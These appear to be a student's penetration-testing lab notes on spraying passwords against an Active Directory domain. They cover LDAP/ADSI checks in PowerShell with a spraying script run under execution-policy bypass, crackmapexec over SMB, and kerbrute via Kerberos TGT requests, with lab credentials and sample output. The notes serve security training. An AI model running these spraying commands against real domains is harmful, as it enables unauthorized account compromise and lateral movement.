	- When performing a brute force or wordlist authentication attack, we must be aware of account lockouts.

Set up:
	- RDP user jeff on CLIENT75 with the password HenchmanPutridBonbon11.
	- Obtain the account policy with **net accounts**
		-`net accounts`

1st Type of password attack (LDAP & ADSI):
- Uses LDAP and ADSI to perform a low and slow password attack against AD users.
	- we can also make queries in the context of a different user by setting the DirectoryEntry instance
		- provide three arguments, including the LDAP path to the domain controller, the username, and the password
	- ```$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")```
	- output -> ```distinguishedName : {DC=corp,DC=com}
		Path: LDAP://DC1.corp.com/DC=corp,DC=com```
	- To avoid incorrect password Exceptions
		-change the password in the constructor to **WrongPassword**
- We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.
	-This password spraying tactic is already implemented in the PowerShell script **`C:\Tools\Spray-Passwords.ps1`**
	-`cd C:\Tools`
	- `powershell -ep bypass`
	- `.\Spray-Passwords.ps1 -Pass Nexus123! -Admin`
		- -Pass =  set a single password to test
		- -File =  submit a wordlist file 
		- -Admin = test admin accounts
	- Output --> ```'pete' with password: 'Nexus123!'
		 'jen' with password: 'Nexus123!'```

2nd Type of Password spraying attack ([[SMB]]):
	- Drawback:
		- For example, for every authentication attempt, a full SMB connection has to be set up and then terminated.
	- **[[crackmapexec]]**
		- `cat users.txt`
		- `crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success`
			- smb = protocol
			- -u = username/file
			- -p = password
			- -d = domain
			- --continue-on-success = avoid stopping at the first valid credential
	- Bonus:
		- output of crackmapexec not only displays if credentials are valid, but also if the user with the identified credentials has admin priv on tgt system
	- Dave is a local admin on CLIENT75. Let's use crackmapexec with the password Flowers1 targeting this machine
		-`crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com`

3rd Type of Password spraying attack (TGT)
- *kinit*
	- Can obtain and cache a Kerberos TGT
		- Need to provide a username and password
	- Advantage:
		-  only uses two UDP frames
			- To determine whether the password is valid, it sends only an AS-REQ and examines the response
- *kerbrute*
	- automate obtaining and caching a Kerberos TGT
	- Location: **`C:\Tools`**
	`.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"`
		- passwordspray = command 
		- -d = domain
		- user.file pass
		-[`If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.`]